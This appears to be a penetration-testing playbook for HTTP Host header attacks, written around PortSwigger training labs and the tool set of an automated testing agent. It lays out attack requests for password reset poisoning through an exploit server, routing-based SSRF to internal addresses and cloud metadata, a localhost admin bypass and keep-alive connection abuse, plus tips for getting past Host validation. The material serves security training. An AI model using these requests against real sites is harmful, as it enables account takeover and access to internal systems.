# HTTP Host Header Attacks Methodology
## Expert-Level Playbook (reset poisoning, cache, auth bypass, routing SSRF)

> 5 PortSwigger labs. The app trusts the Host (or an override header) to build
> absolute URLs, route requests, or gate access. Change one host-related header
> at a time and diff behavior. Raw sending (`caido_local_api`/`burp_send_http1_request`)
> lets you set duplicate/absolute-form hosts a normal client won't allow.

---

## Phase 1: Probe host handling

### 1.1 Baseline + tamper
```
capture_baseline url=https://TARGET/
# then vary, one at a time:
Host: evil.test
Host: TARGET          + X-Forwarded-Host: evil.test
Host: TARGET          + X-Host: evil.test
Host: TARGET          + X-Forwarded-Server: evil.test
Host: TARGET:evil.test     (port confusion)
Host: TARGET
Host: evil.test            (duplicate Host)
absolute-form: GET https://TARGET/ HTTP/1.1  + Host: evil.test
```
Check whether the injected host is reflected in the body (links, scripts,
password-reset URLs) or changes routing/status.

### 1.2 Override header discovery
Brute the usual suspects with `burp_send_to_intruder` / `ffuf_fuzz`:
`X-Forwarded-Host, X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded,
X-Original-URL, X-Rewrite-URL, X-Forwarded-Scheme/Proto`.

---

## Phase 2: Exploitation per sub-variant

| Sub-variant | Technique |
|-------------|-----------|
| Password reset poisoning | trigger reset; Host controls the reset link domain → victim clicks → token to attacker |
| Web cache poisoning via Host | unkeyed `X-Forwarded-Host` reflected + cached (see cache_poisoning.md) |
| Auth bypass via Host | admin panel gated by `Host: localhost`/internal name → set it |
| Host header authentication bypass | override header trusted for "internal" access |
| Routing-based SSRF | front-end routes by Host → point Host at an internal host/metadata |
| Connection-state / first-request routing | reuse a keep-alive connection whose first request set a trusted Host |
| SSRF via a malformed request line | absolute-form target + Host mismatch reaches internal service |

### 2.1 Password reset poisoning
```
POST /forgot-password HTTP/1.1
Host: exploit-XXXX.exploit-server.net      (or X-Forwarded-Host: ...)

username=carlos
```
The emailed reset link points at your host; capture the token from the exploit
server access log, then reset the victim's password.

### 2.2 Routing-based SSRF
```
Host: 192.168.0.1            # front-end forwards to internal host
Host: 169.254.169.254        # cloud metadata via routing
```
Confirm blind routing with `oob_get_domain`/`oob_poll`, then target the internal
resource the lab requires.

### 2.3 Auth bypass
```
GET /admin HTTP/1.1
Host: localhost
```
Or set the override header the app trusts for "local"/internal requests.

### 2.4 Connection-state attack
Front-end validates the Host only on the first request of a connection; send a
valid first request then a malicious second on the same keep-alive connection
(`burp_send_http1_request`, disable connection reset).

---

## Phase 3: Tooling

```
http_request              # quick header tampering + reflection checks
caido_local_api / burp_send_http1_request  # duplicate/absolute-form Host, keep-alive state
capture_baseline / diff_against_baseline    # detect behavioral change
oob_get_domain / oob_poll  # routing-based SSRF confirmation
exploit_server             # capture poisoned reset-link tokens
burp_send_to_intruder / ffuf_fuzz  # override-header discovery
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Host validated | Try override headers, duplicate Host, absolute-form, port confusion |
| Reset link not poisoned | Use `X-Forwarded-Host`; confirm which header builds the link |
| Nothing reflected | Look for routing/auth effects, not just body reflection |
| Client blocks bad Host | Use raw send (Caido/Burp), not curl/requests |
| SSRF blind | Prove with OOB before targeting internal host |

## Validation / Success Criteria
- [ ] A host-controlled value reaches a sensitive sink (reset link, cache, route, auth).
- [ ] Control request with the original Host does not reproduce the impact.
- [ ] Lab solved banner or victim impact observed.
